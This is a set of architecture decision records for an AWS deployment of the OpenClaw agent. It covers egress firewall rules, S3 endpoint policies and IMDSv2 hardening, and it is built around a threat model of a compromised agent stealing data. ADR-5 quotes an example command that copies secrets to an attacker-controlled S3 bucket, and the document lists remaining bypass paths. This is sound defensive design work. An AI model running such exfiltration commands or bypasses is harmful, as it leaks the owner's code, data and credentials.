# Architecture Decision Records

Decisions that shaped [code-to-doc-aws.yaml](code-to-doc-aws.yaml). Each ADR captures a single decision: the problem that prompted it, what we chose, what else was considered, and the consequences we accepted. The template itself is the source of truth for *what's deployed*; this doc explains *why*.

Threat model context (referenced throughout): a compromised OpenClaw runtime — running as `ec2-user` with the EC2 instance role — attempts to exfiltrate **intellectual property and customer data** (source code, documents, scan results) via AWS APIs or the network. Credential / secret theft is a related but secondary concern. Out of scope: an attacker with kernel- or raw-socket-level access to the host (file system tampering, DNS poisoning, SNI spoofing via custom networking code).

---

## ADR-1: Network Firewall rules use `STRICT_ORDER` + explicit Suricata `RulesString`

**Status:** Accepted

**Context:** Need an FQDN allow-list on egress with a default-deny for anything not explicitly allowed.

**Decision:** Rule group uses `RuleOrder: STRICT_ORDER` with explicit Suricata `pass` / `drop` rules in `RulesString`. Catch-all `drop tls` and `drop http` at the end of the rule string. `StatefulDefaultActions: [drop_established, alert_established]` on the policy as belt-and-suspenders.

**Alternatives considered:**
- `RulesSourceList ALLOWLIST` (the simplified domain-list form). Doesn't reliably drop unmatched traffic under strict order despite AWS docs implying it should.
- `DEFAULT_ACTION_ORDER`. Doesn't give explicit rule precedence for security review.

**Consequences:**
- Predictable evaluation: first matching rule wins, in `RulesString` order.
- Several Suricata keywords are rejected under STRICT_ORDER: `priority:N;`, `classtype:...;`, and `nocase` on `http.host` (Suricata normalizes the buffer to lowercase, the redundant flag rejects the rule).
- `StatefulRuleOptions.RuleOrder` is effectively immutable. Switching between STRICT_ORDER and DEFAULT_ACTION_ORDER via update-stack returns `parameter is invalid`. To switch, detach the rule group from the policy, delete it, and recreate.

---

## ADR-2: Symmetric routing forces return traffic back through the firewall

**Status:** Accepted

**Context:** Suricata's stateful engine needs both directions of every flow to reassemble TLS / HTTP and match rules on `tls.sni` / `http.host`. By default, return traffic from the NAT Gateway uses the VPC's implicit local route (10.0.0.0/16 → local) straight back to the instance ENI, bypassing the firewall.

**Decision:** Add `PublicSubnetFirewallReturnRoute` — a more-specific route (10.0.2.0/24 → firewall ENI) in the public subnet's route table, overriding the implicit local route.

**Alternatives considered:**
- Stateless-only firewall mode. Loses TLS SNI inspection — the allow-list becomes meaningless.
- Separate VPC for the instance. More complex; doesn't add value for a single-tenant deploy.

**Consequences:**
- Symmetric routing works; rules fire correctly on `tls.sni` / `http.host`.
- The route is brittle to subnet CIDR changes. If the instance subnet's CIDR changes, this destination must update to match.
- First diagnostic when a rule misfires: check this route. Flow logs showing `"app_proto": "unknown"` is the canonical symptom of asymmetric routing.

---

## ADR-3: `dotprefix` domain matching pattern

**Status:** Accepted

**Context:** Allow-list entries need to match both the exact domain (`example.com`) and any subdomain (`a.b.example.com`), but not lookalikes (`evilexample.com`).

**Decision:** Use `tls.sni; dotprefix; content:".example.com"; endswith;` for every allow-list entry. (Same shape with `http.host` for HTTP.)

**Alternatives considered:**
- `endswith:".example.com"`. Fails to match exact `example.com`.
- `endswith:"example.com"`. False-allows `evilexample.com`.
- Per-host allow-list. Brittle; breaks every time a service adds a new subdomain.

**Consequences:**
- Allow-list is concise — one rule per domain family.
- Subdomains are implicitly allowed. If a service registers an attacker-controlled subdomain (e.g., a takeover-able `*.docker.com`), the allow-list is bypassed. For families where this matters, switch to exact-host matching.

---

## ADR-4: Interface VPCEs for AWS APIs (not a public-internet allow-list)

**Status:** Accepted

**Context:** AWS API calls (Bedrock, SSM, STS, CloudFormation, CodeArtifact, EC2 metadata-tag lookup, etc.) need to work from a private-subnet instance behind a firewall. Allow-listing `*.amazonaws.com` would be far too broad — every AWS service in every account would be reachable.

**Decision:** Provision interface VPCEs for each AWS API the instance uses: `bedrock-runtime`, `bedrock-mantle` (regional), `ssm`, `ssmmessages`, `ec2messages`, `sts`, `ec2`, `cloudformation`, `codeartifact.api`, `codeartifact.repositories`. All with `PrivateDnsEnabled: true` so AWS SDK calls resolve transparently.

**Alternatives considered:**
- `*.amazonaws.com` at the firewall. Excessively broad; was the original state. Reviewer concern that prompted the S3 VPCE policy work originated here.
- Per-service hostname allow-list (e.g., `bedrock-runtime.eu-west-1.amazonaws.com`). Brittle; AWS adds and renames service endpoints, and SNI doesn't always match a single hostname.

**Consequences:**
- Traffic stays on AWS backbone; no NAT, no firewall hop.
- ~$10/month per interface VPCE. With ~10 endpoints, ~$100/mo overhead.
- Adding a new AWS API to the workload requires either a new VPCE or a permissive firewall hole — making the cost of expanding API surface explicit.

---

## ADR-5: S3 Gateway VPCE with same-account read-only `PolicyDocument`

**Status:** Accepted

**Context:** Same-region S3 traffic should stay on the AWS backbone (gateway VPCE is the standard solution: free, route-table-based). Without a `PolicyDocument`, the gateway VPCE allows every S3 API to every bucket — and bypasses Network Firewall via the prefix-list route. Anything blocked at the firewall for S3 you can step around just by using the regional S3 endpoint. This is the channel a reviewer flagged as the most plausible exfiltration vector.

**Decision:** Attach a `PolicyDocument` with three statements: Allow read-only S3 actions where `aws:ResourceAccount` matches this stack's account; Allow read-only access to AL2023 dnf repo buckets (see ADR-7); Deny everything else.

**Alternatives considered:**
- No `PolicyDocument` (the original state). Too permissive.
- Bucket-by-bucket allow-list. High maintenance; every new bucket the workload uses requires a template change.
- Disable the gateway VPCE entirely and route S3 through the firewall. Loses backbone benefit and forces an `s3.amazonaws.com` allow-list rule that's just as broad as no policy.

**Consequences:**
- `aws s3 cp ./secrets s3://attacker-bucket/` (any cross-account bucket) is denied at the VPCE.
- `s3:ListAllMyBuckets` is denied (action not in allow-list). `aws s3 ls` (no bucket arg) doesn't work; `aws s3 ls s3://your-bucket/` does. Add `s3:ListAllMyBuckets` to the allow-list if you want plain `aws s3 ls`.
- **Same-account public-bucket exfil is not prevented.** Agent writes to a same-account bucket whose own bucket policy allows public read; attacker fetches publicly. VPCE policies operate at the network layer; can't inspect bucket policies. Mitigation is org-level: SCP forbidding `s3:DeletePublicAccessBlock` plus org-wide S3 Block Public Access. Outside template scope.

---

## ADR-6: `aws:ResourceAccount` (not `aws:ResourceOrgID`) for the same-account fence

**Status:** Accepted

**Context:** When restricting S3 access to "buckets we own," there are two natural condition keys: `aws:ResourceAccount` (matches a specific account ID) and `aws:ResourceOrgID` (matches any account in the org).

**Decision:** Use `aws:ResourceAccount: !Ref AWS::AccountId`.

**Alternatives considered:**
- `aws:ResourceOrgID`. Lets the agent reach any same-org account's bucket — including a misconfigured dev/test bucket the attacker has compromised, or a staging bucket the attacker has staged for retrieval.

**Consequences:**
- Strictly tighter than `aws:ResourceOrgID`. Cross-account S3 (even within the org) is blocked.
- A future deployment that legitimately reads from a sibling-account bucket needs an explicit allow for that bucket's ARN, not a relaxation of the condition.

---

## ADR-7: AL2023 dnf repo carve-out pinned by bucket-name only (not account ID)

**Status:** Accepted

**Context:** AL2023's dnf metadata and packages live in S3 buckets named `al2023-repos-<region>-<random-suffix>`, owned by AWS. Without a carve-out, the same-account-only Deny in ADR-5 blocks every `dnf` operation with `403`. We need to allow read access to these AWS-owned buckets without re-opening cross-account access in general.

**Decision:** Add an explicit Allow for `arn:aws:s3:::al2023-repos-${AWS::Region}-*` (and `/*`), pinned only by the bucket-name pattern. The cross-account Deny `NotResource`-excludes the same ARN pattern (otherwise explicit Deny would override the Allow regardless of statement order).

**Alternatives considered:**
- Pin by both bucket name AND `aws:ResourceAccount: "137112412989"`. A security advisor cited that account ID as Amazon Linux's service account, but the deploy still 403'd — that account isn't the bucket owner for AL2023 repos in eu-west-1, and we couldn't verify the correct ID without `s3api get-bucket-acl`-equivalent access (the bucket policy denies it from customer accounts).
- Allow any AWS-owned account. AWS doesn't publish a canonical list, and this fence would effectively be "trust AWS-owned buckets."
- Keep Ubuntu and use a Lambda-mirror approach (see ADR-8). Different problem; doesn't apply once we're on AL2023.

**Consequences:**
- Bucket-name-spoofing risk: an attacker registers `al2023-repos-<region>-evilxxxx` and serves poisoned RPMs. Under the agent threat model, this requires either modifying `/etc/yum.repos.d/amazonlinux.repo` (needs root, out of scope) or poisoning DNS (VPC uses AWS managed resolver, out of reach for the agent). Acceptable.
- If a future deployment with a wider threat model wants the tighter pin, run `aws s3api get-bucket-acl --bucket al2023-repos-<region>-<suffix> --query Owner.ID` from a privileged context, get the actual account ID, and add `aws:ResourceAccount` back.

---

## ADR-8: Amazon Linux 2023 base AMI (instead of Ubuntu)

**Status:** Accepted (supersedes Ubuntu 24.04)

**Context:** Ubuntu 24.04 needed two bootstrap-time fetches from public AWS-hosted artifacts (`awscli.amazonaws.com` and `s3.amazonaws.com/cloudformation-examples/...`). Both required wildcard firewall allow-list entries — `s3.amazonaws.com` in particular was the wildcard that made S3 exfil trivially possible (see ADR-5). The reviewer concern that triggered this PR.

**Decision:** Switch base AMI from Ubuntu 24.04 to Amazon Linux 2023 (`/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-${Arch}`). AL2023 ships `aws-cfn-bootstrap` (`cfn-init`/`cfn-signal`) and `awscli` v2 preinstalled.

**Alternatives considered:**
- Keep Ubuntu, add a customer-owned S3 bucket plus a custom-resource Lambda to mirror the two AWS-hosted artifacts into it. Functional, but adds a bucket, a Lambda, a custom resource, and a version-pin maintenance burden.
- Keep Ubuntu, pre-bake awscli + cfn-bootstrap into a custom AMI via Packer/EC2 Image Builder. ~1-2 days of pipeline work plus ongoing maintenance.

**Consequences:**
- Four firewall rule pairs deleted: `s3.amazonaws.com`, `awscli.amazonaws.com`, `.ubuntu.com` (apt mirrors), `.docker.com` (Docker apt-repo install path).
- setup.sh ported: `apt` → `dnf` (~5 sites), `ubuntu` user → `ec2-user` (~30 sites), Snap SSM agent start removed (preinstalled systemd unit), Docker apt-repo dance replaced with `dnf install -y docker`.
- `cfn-init`/`cfn-signal` live at `/opt/aws/bin/` on AL2023; the bootstrap stub references that path explicitly because `/opt/aws/bin` isn't in root's interactive PATH at the very early UserData stage.
- AL2023's dnf metadata lives in an AWS-owned S3 bucket — adds a VPCE-policy carve-out (see ADR-7).
- Loses default `git` from the base image (cloud Ubuntu shipped it). Added explicitly to `dnf install -y unzip git` because openclaw plugin enable invokes `npm install <git-url>` for some bundled channels.

---

## ADR-9: `CreationPolicy.ResourceSignal` instead of `WaitConditionHandle`

**Status:** Accepted (supersedes WaitConditionHandle/WaitCondition)

**Context:** Stack creation needs to block on bootstrap success. The legacy `AWS::CloudFormation::WaitConditionHandle` resolves at template-time to a pre-signed S3 PUT URL pointing at `s3://cloudformation-waitcondition-<region>/...` — owned by an AWS-managed account. With the same-account-restricted Gateway VPCE policy from ADR-5, that PUT is denied; stack hangs in `CREATE_IN_PROGRESS` until timeout.

**Decision:** Use `CreationPolicy.ResourceSignal: Timeout: PT45M` on the EC2 instance. Bootstrap signals via the CFN service API (`SignalResource`), which traverses the existing CloudFormation interface VPCE — no S3, no AWS-owned bucket dependency.

**Alternatives considered:**
- Carve `cloudformation-waitcondition-${AWS::Region}` out of the Deny via `NotResource` + an explicit Allow. Works, but leaves an AWS-bucket exception in the policy and keeps a dependency on AWS's pre-signed URL service for stack lifecycle.

**Consequences:**
- VPCE policy stays free of cloudformation-waitcondition exceptions.
- `cfn-signal --stack/--resource` is less retry-resilient than the legacy S3 PUT path. Bootstrap wraps the call in a 5-attempt exponential-backoff loop (5s → 80s); `SignalResource` is idempotent so retries are safe.
- `WaitCondition.Data` is gone; any Output that used it has to find another channel (see ADR-10).

---

## ADR-10: SSM Parameter Store for gateway token (instead of `WaitCondition.Data`)

**Status:** Accepted

**Context:** The gateway authentication token is generated on the instance during bootstrap (`openssl rand -hex 24`) and exposed to the user via the `Step3AccessURL` CFN Output. Previously it traveled through `WaitCondition.Data` — which is gone after ADR-9.

**Decision:** Bootstrap writes the token to SSM Parameter Store as a SecureString at `/openclaw/<stack>/gateway-token`. The `Step3AccessURL` Output is a shell command the user runs locally to fetch and print the access URL.

**Alternatives considered:**
- Generate the token at template-deploy time (e.g., `AWS::SecretsManager::Secret` with auto-generation). Adds another resource and changes when the token is generated.
- Keep `WaitCondition.Data`. Doesn't survive ADR-9.

**Consequences:**
- Encryption at rest (default KMS key) and CloudTrail audit trail; modest improvement over previous in-CFN-service plaintext.
- Output is a shell command, not a literal URL. User pastes it into their laptop terminal; it prints the URL.
- The agent (instance role) can read the token from SSM. By design — the token is what the gateway uses to authenticate clients, the agent has it in memory at runtime regardless.

---

## ADR-11: CodeArtifact npm proxy with `public:npmjs` upstream

**Status:** Accepted

**Context:** OpenClaw 2026.4+ installs per-extension npm packages on first boot. Those installs run synchronously, blocking Node's event loop. The npm tarballs come from CDN-fronted endpoints (Cloudflare, Fastly) that don't appear under any single allow-listable domain. Allow-listing them at the firewall would be whack-a-mole.

**Decision:** Route npm through AWS CodeArtifact with an upstream connection to `public:npmjs`. The instance only talks to the CodeArtifact `repositories` interface VPCE; CodeArtifact upstream-fetches via AWS-managed network.

**Alternatives considered:**
- Allow-list every CDN that npmjs uses (Cloudflare ranges, Fastly ranges). Brittle; ranges change without notice.
- Pin OpenClaw to `2026.3.24` (the last version that doesn't do runtime npm-installs). Locks us out of upstream features.
- Run `npm ci` at AMI-bake time. Doesn't help — extension installs happen per-config at runtime.

**Consequences:**
- All npm traffic goes via the AWS backbone; firewall sees no npmjs traffic.
- CodeArtifact charges ~$0.05/GB cached + $0.50/10K requests. Negligible at this scale.
- CodeArtifact tokens have a hard 12-hour TTL — drives the wrapper in ADR-12.

---

## ADR-12: npm wrapper with recursion sentinel for token refresh

**Status:** Accepted

**Context:** CodeArtifact authentication tokens written to `~/.npmrc` have a 12-hour TTL with no extension. Need to keep the token fresh without a background process whose health we'd have to monitor.

**Decision:** Shadow the real `npm` with a wrapper that refreshes the token if `.npmrc` is older than 11h. A `_NPM_CA_REFRESH_DONE` env var prevents recursion when `aws codeartifact login --tool npm` internally calls `npm config set registry`.

**Alternatives considered:**
- Systemd timer running every 11h. Fewer per-call checks, but if the timer silently fails the gateway hits 401s and you don't notice until something breaks.
- One-shot refresh during setup.sh. Only safe for `2026.3.24` and earlier (no runtime npm calls after gateway start).

**Consequences:**
- Self-healing per call; ~3ms overhead when fresh, ~1s when refresh is needed.
- The recursion sentinel is load-bearing. Without it, `aws codeartifact login` recursively calls the wrapper, fanning out a process tree that pegs CPU and starves the SSM agent — a ~30 minute lockup the first time we hit it.

---

## ADR-13: Bind mount `/data/openclaw` at `~/.openclaw` (instead of symlink)

**Status:** Accepted

**Context:** OpenClaw's exec-approvals policy refuses workspace paths that traverse a symlink (`Refusing to traverse symlink in exec approvals path`). The data volume needs to be reachable from `/home/ec2-user/.openclaw` so gateway state persists across reboots and AMI updates.

**Decision:** Use `mount --bind /data/openclaw /home/ec2-user/.openclaw` and add the bind mount to `/etc/fstab`.

**Alternatives considered:**
- Symlink. Trips the exec-approvals policy.
- Mount the data volume directly at `/home/ec2-user/.openclaw`. Conflates filesystem layout with home-directory layout; the data volume is intentionally separate from the root volume.

**Consequences:**
- Path is a real directory from OpenClaw's perspective.
- One more entry in `/etc/fstab`.
- If the data volume isn't attached at boot, `[0/9]` silently skips the mount block and setup writes to the root volume. Always re-attach the data volume to `/dev/sdf` before booting if you've manually detached it.

---

## ADR-14: Explicit `Ebs.Encrypted: true` (don't rely on account default)

**Status:** Accepted

**Context:** Account-level default EBS encryption is off in many AWS accounts. Relying on it leaks unencrypted root volumes on those accounts.

**Decision:** Set `BlockDeviceMappings /dev/sda1 Ebs.Encrypted: true` and the same on the data volume.

**Alternatives considered:** Rely on account-level default (which the template can't see).

**Consequences:** Encryption guaranteed regardless of account setting. ~5% performance overhead on EBS I/O — within noise for our workload.

---

## ADR-15: IMDSv2 enforcement (`HttpTokens: required`)

**Status:** Accepted

**Context:** IMDSv1 is the source of nearly every "instance role credentials exfiltrated via SSRF" incident. Even though our threat model excludes the kernel-level attacker, the agent-as-attacker model still includes "agent reads instance metadata to extract role creds and exfiltrates them via the LLM prompt channel."

**Decision:** Set `MetadataOptions.HttpTokens: required` to force IMDSv2 (token-based, no anonymous reads).

**Alternatives considered:** Default (`optional`). Instance still serves IMDSv1.

**Consequences:**
- IMDSv1 fallback code in setup.sh is unreachable. Cosmetic; fine to leave.
- Reduces credential-exfil surface meaningfully. Doesn't eliminate it — the agent can still call `aws sts get-caller-identity` directly through the role.

---

## Operational notes

These aren't decisions — they're how-to-operate facts that don't fit the ADR shape.

### Failure preservation during debug

Rollback terminates the instance and loses `/var/log/openclaw-{bootstrap,setup}.log`. For debug cycles, use:
- Console: *Stack failure options* → **Preserve successfully provisioned resources**.
- CLI: `--on-failure DO_NOTHING` on `create-stack`, `--disable-rollback` on `deploy`.

### SSM diagnostic flow

```bash
export INSTANCE_ID=$(aws cloudformation describe-stack-resources \
  --stack-name $STACK --logical-resource-id OpenClawInstance \
  --query 'StackResources[0].PhysicalResourceId' --output text)

aws ssm start-session --target $INSTANCE_ID
# Then on the instance:
sudo -i
tail -F /var/log/openclaw-bootstrap.log /var/log/openclaw-setup.log
```

The last `[N/9]` line in the setup log tells you where it stopped. `$INSTANCE_ID` goes stale across stack recreations — re-export after each fresh stack.

### Validating VPCE policy changes without a full redeploy

VPC endpoint policies can be patched in-place via `aws ec2 modify-vpc-endpoint --policy-document file://policy.json`. Useful for validating a policy tweak before committing to a full stack recreate. CFN won't track the in-place patch as drift after the recreate. Used this to validate ADR-7 before merging.

### `XDG_RUNTIME_DIR` in SSM session shells

SSM Session Manager shells on AL2023 don't export `XDG_RUNTIME_DIR`, so `systemctl --user` can't reach the user systemd bus from an interactive shell:

```
Failed to connect to bus: No medium found
```

The gateway service runs fine — only `systemctl --user`'s introspection fails. Set the env var before running commands that need it:

```bash
export XDG_RUNTIME_DIR=/run/user/$(id -u)
```

`code-to-doc/installer/install.sh` always-overrides this at the top so users running it from SSM shells don't hit the issue.

### Bootstrap timing per instance type

| Instance type | Cold-cache setup time | Notes |
|---|---|---|
| `c7g.xlarge` (4 vCPU, 8 GB) — template default | 15–25 min | SSM stays online throughout |
| `c7g.large` (2 vCPU, 4 GB) | 35–50 min | CPU pegs during npm install; SSM agent goes offline mid-bootstrap |
| `t4g.medium` and smaller | unstable | SSM agent likely starves — not recommended for fresh deploys |

Fresh deploys (cold CodeArtifact cache) are the worst case. Subsequent stack-update instance replacements are 2–3× faster.

### Bedrock inference profile requirement

Newer Anthropic Claude models (3.x+, 4.x+) require invocation via an inference profile, not the bare foundation model ID. `OpenClawModel` defaults to `eu.anthropic.claude-sonnet-4-5-20250929-v1:0`. Bare IDs return `Validation error: ... isn't supported. Retry your request with the ID or ARN of an inference profile`. OpenClaw's plugin auto-discovery enumerates inference profiles via `bedrock:ListInferenceProfiles`, so prefixed IDs work transparently.

### CloudWatch Logs resource policy is required for firewall logs

Without `AWS::Logs::ResourcePolicy` allowing `delivery.logs.amazonaws.com` to write, the firewall silently fails to deliver logs — `aws logs tail` comes back empty even when drops are happening. The policy's `Resource` block must list both the alert and `/flow` log group ARNs explicitly; the `:*` wildcard only covers log streams within a single group.

### Firewall flow logs are the definitive inspection telemetry

When blocking misbehaves, check `/aws/network-firewall/$STACK/flow`:
- No entries → firewall isn't seeing the traffic (routing bug — see ADR-2).
- Entries with `"app_proto": "unknown"` → stateful engine broken, almost always asymmetric routing.
- Entries with `"app_proto": "tls"` and `"alerted": true` → working correctly.

### AWS CLI v2 paginates by default

`export AWS_PAGER=""` or set `cli_pager=` under the profile in `~/.aws/config`, otherwise diagnostic commands hang behind a pager.

### Template > 51 KB requires S3 upload

Plain `create-stack --template-body file://…` fails with `Member must have length less than or equal to 51200`. Use `aws cloudformation deploy --template-file … --s3-bucket …` (auto-uploads) or upload via the console's "Upload a template file" form.

### `Fn::Sub` escape rules

- `${X}` is a CFN reference. CFN errors if `X` isn't a parameter, resource, or built-in.
- `${!X}` renders literally as `${X}` — used to pass shell variables through to bash.
- The content between `${!` and `}` must only contain alphanumeric, underscore, period, or colon. Bash default-expansion like `${!var:-default}` is invalid because of `:-`.
- `$X` (no braces) is left alone by CFN — simplest way to reference a shell variable.
- CFN parses the entire string regardless of `#` comments.

---

## Acceptance test

From inside the instance, after a successful deploy:

```bash
# Allow rule works
curl -sS --max-time 5 -o /dev/null https://api.github.com/  ; echo "github: $?"   # expect 0

# Catch-all drop works
curl -sS --max-time 5 -o /dev/null https://google.com/      ; echo "google: $?"   # expect 28

# Removed firewall rules now fail
curl -sS --max-time 5 -o /dev/null https://awscli.amazonaws.com/  ; echo "awscli: $?"  # expect 28
curl -sS --max-time 5 -o /dev/null https://s3.amazonaws.com/      ; echo "s3:     $?"  # expect 28
curl -sS --max-time 5 -o /dev/null https://archive.ubuntu.com/    ; echo "ubuntu: $?"  # expect 28
curl -sS --max-time 5 -o /dev/null https://download.docker.com/   ; echo "docker: $?"  # expect 28

# CodeArtifact is the registry (proves ADR-11)
sudo -u ec2-user bash -c 'export NVM_DIR=/home/ec2-user/.nvm; . $NVM_DIR/nvm.sh; npm config get registry'
# expect: ...d.codeartifact.<region>.amazonaws.com/npm/npm-cache/

# AL2023 dnf works (proves ADR-7 carve-out)
sudo dnf check-update 2>&1 | tail -3                                  # no errors

# VPCE policy enforces same-account (proves ADR-5)
aws s3 cp /etc/hostname s3://commoncrawl/test 2>&1 | head -2
# expect: AccessDenied — VPC endpoint policy denies cross-account write

# Gateway responsive on loopback
curl -sS -m 5 -o /dev/null -w "loopback: HTTP %{http_code}\n" http://localhost:18789/
# expect: HTTP 200
```
